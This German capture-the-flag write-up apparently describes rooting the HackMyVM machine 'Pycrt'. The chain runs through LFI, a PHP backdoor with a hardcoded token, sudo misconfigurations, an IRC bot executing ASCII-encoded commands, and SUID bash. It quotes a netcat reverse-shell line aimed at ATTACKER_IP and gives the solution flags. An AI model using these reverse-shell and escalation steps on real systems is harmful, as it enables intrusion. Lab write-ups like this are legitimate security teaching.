# Pycrt - HackMyVM (Medium)
 
![Pycrt.png](Pycrt.png)

## Übersicht

*   **VM:** Pycrt
*   **Plattform:** (https://hackmyvm.eu/machines/machine.php?vm=Pycrt)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 16. Mai 2025
*   **Original-Writeup:** https://alientec1908.github.io/Pycrt_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Die "Pycrt"-Maschine auf HackMyVM (Medium) erforderte eine mehrstufige Privilegienerweiterung. Der Lösungsweg begann mit der Identifizierung offener Dienste (SSH, HTTP, IRC). Eine Local File Inclusion (LFI) im Webserver führte zur Entdeckung einer Remote Code Execution (RCE) Backdoor im PHP-Skript `bydataset.php`. Dies ermöglichte initialen Zugriff als `www-data`. Die Rechte wurden dann über eine unsichere `sudo`-Regel (`weechat`) auf den Benutzer `chatlake` erweitert. Eine weitere `sudo`-Regel erlaubte `chatlake`, einen IRC-Bot-Dienst zu starten, der auf ASCII-kodierte Befehle im IRC reagierte und diese als Benutzer `pycrtlake` ausführte, was zu einer Shell als `pycrtlake` führte. Die finale Eskalation zu Root erfolgte durch Ausnutzung einer SUID-gesetzten `/bin/bash`-Executable mittels `bash -p`.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi` (Editor)
*   `curl`
*   `nmap`
*   `nikto`
*   `nc` (Netcat)
*   `openssl`
*   `git` (zum Klonen von Exploits)
*   `python2`
*   `python3` (für RCE- und Payload-Skripte)
*   `gobuster`
*   `feroxbuster`
*   `dirb`
*   `wfuzz`
*   `base64`
*   `Irssi` / `WeeChat` (IRC-Clients)
*   `xvfb-run` (impliziert für gtkwave Exploit)
*   `script` (für TTY-Stabilisierung)
*   Standard Linux-Befehle (`ls`, `cat`, `find`, `cd`, `chmod`, etc.)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Pycrt" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Enumeration:**
    *   IP-Adresse (`192.168.2.192`) via `arp-scan` gefunden und `/etc/hosts` Eintrag für `pycrt.hmv` erstellt.
    *   `nmap` identifizierte offene Ports: 22 (SSH OpenSSH 8.4p1), 80 (HTTP Apache 2.4.62), 6667 (IRC InspIRCd-3).
    *   `nikto` auf Port 80 zeigte fehlende Sicherheitsheader, aber keine kritischen direkten Schwachstellen.

2.  **Web Enumeration & LFI-Entdeckung:**
    *   `gobuster` und `feroxbuster` auf Port 80 führten zur Entdeckung des Verzeichnisses `/ShadowSec/`.
    *   `dirb` fand im `/ShadowSec/`-Verzeichnis die Datei `bydataset.php`.
    *   `wfuzz` identifizierte eine Local File Inclusion (LFI)-Schwachstelle im `file`-Parameter von `bydataset.php`, was das Lesen von `/etc/passwd` ermöglichte.

3.  **Initial Access (RCE via PHP Backdoor als `www-data`):**
    *   Mittels LFI und `php://filter` wurde der Quellcode von `bydataset.php` ausgelesen.
    *   Der Quellcode enthielt eine Backdoor: POST-Anfragen mit korrektem `auth`-Token (`LetMeIn123!`) und einer speziell formatierten (`cmd:`-präfix, base64, reversed) `payload` erlaubten Remote Code Execution (RCE).
    *   Ein Python-Skript wurde erstellt (`rce_brute.py`), um Befehle über diese RCE auszuführen.
    *   Eine Python-basierte Reverse Shell wurde über die RCE als Benutzer `www-data` etabliert.

4.  **Privilege Escalation (von `www-data` zu `chatlake`):**
    *   `sudo -l` als `www-data` zeigte, dass `/usr/bin/weechat` als Benutzer `chatlake` ohne Passwort ausgeführt werden konnte.
    *   Diese `sudo`-Regel wurde ausgenutzt (vermutlich durch `/exec` in WeeChat oder eine ähnliche Methode), um eine Shell als `chatlake` zu erlangen.

5.  **Privilege Escalation (von `chatlake` zu `pycrtlake`):**
    *   `sudo -l` als `chatlake` zeigte, dass `/usr/bin/systemctl start irc_bot.service` als `ALL` (Root) ohne Passwort ausgeführt werden konnte.
    *   Der `irc_bot.service` wurde gestartet.
    *   Durch Interaktion mit dem IRC-Bot (vermutlich Nick `admin` oder `Todd` in Kanal `#chan1`) über einen IRC-Client (Irssi/WeeChat) konnten Befehle an den Bot gesendet werden.
    *   Der Bot erwartete Befehle als eine Sequenz von ASCII-Werten, abgeschlossen mit `:)`. Diese Befehle wurden als Benutzer `pycrtlake` ausgeführt.
    *   Eine Reverse-Shell-Payload (z.B. `busybox nc -e /bin/bash ATTACKER_IP PORT`) wurde ASCII-kodiert und an den Bot gesendet, was zu einer Shell als `pycrtlake` führte.

6.  **Privilege Escalation (von `pycrtlake` zu `root`):**
    *   `sudo -l` als `pycrtlake` zeigte, dass `/usr/bin/gtkwave` als `ALL` (Root) ohne Passwort ausgeführt werden konnte.
    *   Die Datei `/bin/bash` wurde als SUID-Root (`-rwsr-sr-x`) identifiziert.
    *   Durch Ausführen von `/bin/bash -p` in der `pycrtlake`-Shell wurde eine Shell mit effektiven Root-Rechten (`euid=0(root)`) erlangt. (Der `gtkwave`-Sudo-Eintrag könnte hier eine falsche Fährte gewesen sein oder eine nicht primär genutzte Möglichkeit).

## Wichtige Schwachstellen und Konzepte

*   **Local File Inclusion (LFI):** In `bydataset.php` über den `file`-Parameter, ermöglichte das Lesen beliebiger Dateien und des Quellcodes der PHP-Datei selbst.
*   **Remote Code Execution (RCE):** Versteckte Backdoor in `bydataset.php`, ausgelöst durch eine korrekt formatierte POST-Anfrage, erlaubte Befehlsausführung als `www-data`.
*   **Unsichere `sudo`-Konfigurationen:**
    *   `www-data` konnte `weechat` als `chatlake` ausführen (ermöglichte Eskalation zu `chatlake`).
    *   `chatlake` konnte `systemctl start irc_bot.service` als Root ausführen (Schlüssel zur Interaktion mit dem IRC-Bot).
    *   `pycrtlake` konnte `gtkwave` als Root ausführen (potenzieller, aber nicht primär genutzter Vektor im finalen Schritt).
*   **Command Execution via IRC Bot:** Der `irc_bot.service` nahm ASCII-kodierte Befehle entgegen und führte sie als `pycrtlake` aus.
*   **SUID Exploit (bash -p):** Eine SUID-Root gesetzte `/bin/bash`-Executable wurde mit der `-p`-Option ausgenutzt, um Root-Rechte zu erlangen.

## Flags

*   **User Flag (`/home/chatlake/user.txt`):** `flag{b42baba466402e32157a1cbba819664e}`
*   **Root Flag (`/root/root.txt`):** `flag{e80ecc46ca5e00bf8a51c47f0cc3e868}`

## Tags

`HackMyVM`, `Pycrt`, `Medium`, `LFI`, `RCE`, `PHP Backdoor`, `Sudo Exploitation`, `IRC Bot`, `SUID Exploit`, `bash -p`, `Linux`, `Web`, `Privilege Escalation`
